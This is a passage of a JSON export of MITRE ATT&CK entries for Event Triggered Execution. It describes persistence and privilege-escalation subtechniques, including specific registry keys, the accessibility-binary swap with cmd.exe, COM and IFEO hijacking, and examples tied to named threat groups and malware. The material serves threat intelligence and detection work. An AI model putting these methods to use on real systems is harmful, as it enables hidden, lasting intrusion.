        "href": "/techniques/T1546",
        "subtechnique": {
            "001": {
                "name": "Change Default File Association",
                "href": "/techniques/T1546/001",
                "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.[1][2][3] Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under HKEY_CLASSES_ROOT.[extension], for example HKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example: HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\print\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.[4]",
                "Procedure": {
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has a HWP document stealer module which changes the default program association in the registry to open HWP documents.[5]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can conduct an image hijack of an .msc file extension as part of its UAC bypass process.[6]"
                    }
                }
            },
            "002": {
                "name": "Screensaver",
                "href": "/techniques/T1546/002",
                "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.[1] The Windows screensaver application scrnsave.scr is located in C:\\Windows\\System32\\, and C:\\Windows\\sysWOW64\\  on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:SCRNSAVE.exe - set to malicious PE pathScreenSaveActive - set to '1' to enable the screensaverScreenSaverIsSecure - set to '0' to not require a password to unlockScreenSaveTimeout - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.[2]",
                "Procedure": {
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> can establish persistence through the system screensaver by configuring it to execute the malware.[2]"
                    }
                }
            },
            "003": {
                "name": "Windows Management Instrumentation Event Subscription",
                "href": "/techniques/T1546/003",
                "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.[1]Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.[2][3] Adversaries may also compile WMI scripts \u2013 using mofcomp.exe  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.[4][5]WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
                "Procedure": {
                    "S0202": {
                        "ID": "S0202",
                        "Name": "adbupd",
                        "Description": "<name> can use a WMI script to achieve persistence.[6]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used WMI event subscriptions for persistence.[7]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has attempted to use WMI event subscriptions to establish persistence on compromised hosts.[8]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can use WMI event subscriptions for persistence.[9]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.[10]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used WMI event subscriptions for persistence.[11]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used WMI event subscriptions for persistence.[12]"
                    },
                    "S0376": {
                        "ID": "S0376",
                        "Name": "HOPLIGHT",
                        "Description": "<name> can use WMI event subscriptions to create persistence.[13]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> can compile randomly-generated MOF files into the WMI repository to persistently run malware.[12]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used WMI for persistence.[14]"
                    },
                    "G1013": {
                        "ID": "G1013",
                        "Name": "Metador",
                        "Description": "<name> has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as cdb.exe.[15]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> registered a WMI event subscription consumer called \"hard_disk_stat\" to establish persistence.[15]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name>'s custom ORat tool uses a WMI event consumer to maintain persistence.[16]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "During <name>, APT29 used WMI event subscriptions to establish persistence for malware.[17]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> has the ability to persist on a system using WMI events.[18]"
                    },
                    "S0150": {
                        "ID": "S0150",
                        "Name": "POSHSPY",
                        "Description": "<name> uses a WMI event subscription to establish persistence.[19]"
                    },
                    "S0371": {
                        "ID": "S0371",
                        "Name": "POWERTON",
                        "Description": "<name> can use WMI for persistence.[20]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> has complied VBScript-generated MOF files into WMI event subscriptions for persistence.[21]"
                    },
                    "S0511": {
                        "ID": "S0511",
                        "Name": "RegDuke",
                        "Description": "<name> can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started.[17]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> can use a WMI event filter to invoke a command-line event consumer to gain persistence.[22]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.[3]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can create a WMI Event to execute a payload for persistence.[23]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe.[24][25]"
                    },
                    "S0682": {
                        "ID": "S0682",
                        "Name": "TrailBlazer",
                        "Description": "<name> has the ability to use WMI for persistence.[26]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used WMI event filters and consumers to establish persistence.[27]"
                    }
                }
            },
            "004": {
                "name": "Unix Shell Configuration Modification",
                "href": "/techniques/T1546/004",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files.[1][2] These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely.[3][4] Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.[5][3][6][7] Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.[8][9][10][11] The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "Procedure": {
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can establish persistence on a compromised host through modifying the profile, login, and run command (rc) files associated with the bash, csh, and tcsh shells. [12][13]"
                    },
                    "S0362": {
                        "ID": "S0362",
                        "Name": "Linux Rabbit",
                        "Description": "<name> maintains persistence on an infected machine through rc.local and .bashrc files. [14]"
                    },
                    "S1078": {
                        "ID": "S1078",
                        "Name": "RotaJakiro",
                        "Description": "When executing with non-root level permissions, <name> can install persistence by adding a command to the .bashrc file that executes a binary in the  ${HOME}/.gvfsd/.profile/ folder.[15]"
                    }
                }
            },
            "005": {
                "name": "Trap",
                "href": "/techniques/T1546/005",
                "description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.[1][2]",
                "Procedure": {}
            },
            "006": {
                "name": "LC_LOAD_DYLIB Addition",
                "href": "/techniques/T1546/006",
                "description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.[1] There are tools available to perform these changes.Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.[2]",
                "Procedure": {}
            },
            "007": {
                "name": "Netsh Helper DLL",
                "href": "/techniques/T1546/007",
                "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.[1] The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.[2][3]",
                "Procedure": {
                    "S0108": {
                        "ID": "S0108",
                        "Name": "netsh",
                        "Description": "<name> can be used as a persistence proxy technique to execute a helper DLL when <name>.exe is executed.[3]"
                    }
                }
            },
            "008": {
                "name": "Accessibility Features",
                "href": "/techniques/T1546/008",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. [1]Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP). [2] The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. [3]Other accessibility features exist that may also be leveraged in a similar fashion: [2][4]On-Screen Keyboard: C:\\Windows\\System32\\osk.exeMagnifier: C:\\Windows\\System32\\Magnify.exeNarrator: C:\\Windows\\System32\\Narrator.exeDisplay Switcher: C:\\Windows\\System32\\DisplaySwitch.exeApp Switcher: C:\\Windows\\System32\\AtBroker.exe",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> used sticky-keys to obtain unauthenticated, privileged console access.[5][6]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence.[7]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> leveraged sticky keys to establish persistence.[8]"
                    },
                    "G0001": {
                        "ID": "G0001",
                        "Name": "Axiom",
                        "Description": "<name> actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.[9]"
                    },
                    "G0009": {
                        "ID": "G0009",
                        "Name": "Deep Panda",
                        "Description": "<name> has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.[10]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.[11]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used sticky keys to launch a command prompt.[12]"
                    }
                }
            },
            "009": {
                "name": "AppCert DLLs",
                "href": "/techniques/T1546/009",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. [1]Similar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
                "Procedure": {
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> can establish using a AppCertDLLs Registry key.[2]"
                    }
                }
            },
            "010": {
                "name": "AppInit DLLs",
                "href": "/techniques/T1546/010",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. [1]Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. [2] Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. [3]",
                "Procedure": {
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows in order to establish persistence.[4]"
                    },
                    "S0107": {
                        "ID": "S0107",
                        "Name": "Cherry Picker",
                        "Description": "Some variants of <name> use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\"[5]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can insert itself into the address space of other applications using the AppInit DLL Registry key.[6]"
                    },
                    "S0098": {
                        "ID": "S0098",
                        "Name": "T9000",
                        "Description": "If a victim meets certain criteria, <name> uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs \u2013 %APPDATA%\\Intel\\ResN32.dll and HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs \u2013 0x1.[7]"
                    }
                }
            },
            "011": {
                "name": "Application Shimming",
                "href": "/techniques/T1546/011",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. [1]Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:%WINDIR%\\AppPatch\\sysmain.sdb andhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdbCustom databases are stored in:%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom andhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. [2] Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
                "Procedure": {
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used application shim databases for persistence.[3]"
                    },
                    "S0517": {
                        "ID": "S0517",
                        "Name": "Pillowmint",
                        "Description": "<name> has used a malicious shim database to maintain persistence.[4]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe.[5]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> has installed shim databases in the AppPatch folder.[6]"
                    }
                }
            },
            "012": {
                "name": "Image File Execution Options Injection",
                "href": "/techniques/T1546/012",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., C:\\dbg\\ntsd.exe -g  notepad.exe). [1]IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. [2] IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ where <executable> is the binary on which the debugger is attached. [1]IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). [3] [4] Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\. [3] [4]Similar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges. [5]Similar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. [6] Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications. [7] [8]",
                "Procedure": {
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles modified and added entries within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options to maintain persistence.[9]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.[10]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> created an Image File Execution Options (IFEO) Debugger registry value for the process dllhost.exe to trigger the installation of Cobalt Strike.[11]"
                    }
                }
            },
            "013": {
                "name": "PowerShell Profile",
                "href": "/techniques/T1546/013",
                "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. [1] Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched. [2] An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. [3]",
                "Procedure": {
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used PowerShell profiles to maintain persistence on an infected machine.[2]"
                    }
                }
            },
            "014": {
                "name": "Emond",
                "href": "/techniques/T1546/014",
                "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.[1][2][3]Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.[1][2][3] Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.",
                "Procedure": {}
            },
            "015": {
                "name": "Component Object Model Hijacking",
                "href": "/techniques/T1546/015",
                "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.[1]  References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[2] An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
                "Procedure": {
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "Some variants of <name> achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.[3]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.[4][5]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList {42aedc87-2188-41fd-b9a3-0c966feabec1} or Microsoft WBEM New Event Subsystem {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} depending on the system's CPU architecture.[6]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location HKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32.[7]"
                    },
                    "S0679": {
                        "ID": "S0679",
                        "Name": "Ferocious",
                        "Description": "<name> can use COM hijacking to establish persistence.[8]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).[4][9]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has modified ComSysApp service to load the malicious DLL payload.[10]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name> uses COM hijacking as a method of persistence.[11]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has created the HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32 Registry key for persistence.[12]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can add a CLSID key for payload execution through Registry.CurrentUser.CreateSubKey(\"Software\\\\Classes\\\\CLSID\\\\{\" + clsid + \"}\\\\InProcServer32\").[13]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> has created the HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{E6D34FFC-AD32-4d6a-934C-D387FA873A19} Registry key for persistence.[14]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name>  can perform COM hijacking by setting the path to itself to the HKCU\\Software\\Classes\\Folder\\shell\\open\\command key with a DelegateExecute parameter.[15]"
                    }
                }
            },
            "016": {
                "name": "Installer Packages",
                "href": "/techniques/T1546/016",
                "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.[1]Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS postinstall scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a Launch Daemon) with the elevated permissions.[2][3][4][5]Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include preinst, postinst, prerm, postrm scripts and run as root when executed.For Windows, the Microsoft Installer services uses .msi files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.[6]",
                "Procedure": {
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "During <name>'s installation process, it uses postinstall scripts to extract a hidden plist from the application's /Resources folder and execute the plist file as a Launch Daemon with elevated permissions.[7]"
                    }
                }
            }
        },
        "tactic": "Privilege Escalation",
        "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.[1][2][3]Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.[4][5][6]Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
        "Procedure": {
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups.[7]"
            }
        }
    },
    "T1574": {
        "ttp_name": "Hijack Execution Flow",
        "ttp_id": "T1574",
        "href": "/techniques/T1574",
        "subtechnique": {
            "001": {
                "name": "DLL Search Order Hijacking",
                "href": "/techniques/T1574/001",
